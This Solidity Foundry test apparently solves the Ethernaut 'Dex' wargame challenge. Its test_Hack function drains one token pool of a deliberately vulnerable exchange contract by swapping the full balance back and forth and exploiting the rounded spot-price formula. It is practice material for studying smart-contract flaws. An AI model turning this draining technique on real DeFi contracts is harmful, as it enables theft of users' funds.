// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Dex, SwappableToken} from "../src/dex/Dex.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract DexTest is Test {
    Dex public sc;
    SwappableToken public tk1;
    SwappableToken public tk2;

    function setUp() public {
        sc = new Dex();
        tk1 = new SwappableToken(address(sc), "tk1", "tk1", 1000000);
        tk2 = new SwappableToken(address(sc), "tk2", "tk2", 1000000);
        sc.setTokens(address(tk1), address(tk2));
        sc.approve(address(sc), 100);
        sc.addLiquidity(address(tk1), 100);
        sc.addLiquidity(address(tk2), 100);
        tk1.transfer(account.ACC_0, 10);
        tk2.transfer(account.ACC_0, 10);
        assertEq(sc.balanceOf(address(tk1), address(sc)), 100);
        assertEq(sc.balanceOf(address(tk2), address(sc)), 100);
        assertEq(sc.balanceOf(address(tk1), address(account.ACC_0)), 10);
        assertEq(sc.balanceOf(address(tk2), address(account.ACC_0)), 10);
        assertEq(sc.getSwapPrice(address(tk1), address(tk2), 10), 10);
    }

    function test_Hack() public {
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        // approve
        sc.approve(address(sc), 10000);
        // 1 t->2
        while(sc.balanceOf(address(tk1), address(sc)) != 0 && sc.balanceOf(address(tk2), address(sc)) != 0) {
            hackSwap();
        }
        assertTrue(sc.balanceOf(address(tk1), address(sc)) == 0 || sc.balanceOf(address(tk2), address(sc)) == 0);
    }

    function hackSwap() private {
        // check balance
        uint256 balance1 = sc.balanceOf(address(tk1), address(account.ACC_0));
        uint256 balance2 = sc.balanceOf(address(tk2), address(account.ACC_0));
        uint256 balanceleft1 = sc.balanceOf(address(tk1), address(sc));
        uint256 balanceleft2 = sc.balanceOf(address(tk2), address(sc));
        console2.log("balance1:%d, balance2:%d", balance1, balance2);
        console2.log("balanceleft1:%d, balanceleft2:%d", sc.balanceOf(address(tk1), address(sc)), sc.balanceOf(address(tk2), address(sc)));
        uint256 balance;
        if(balance1 >= balance2) {
            // from 1 to 2
            balance = balance1;
            if(balance1 > balanceleft1) {
                balance = balanceleft1;
            }
            sc.swap(address(tk1), address(tk2), balance);
        } else {
            // from 2 to 1
            balance = balance2;
            if(balance2 > balanceleft2) {
                balance = balanceleft2;
            }
            sc.swap(address(tk2), address(tk1), balance);
        }
    }
}
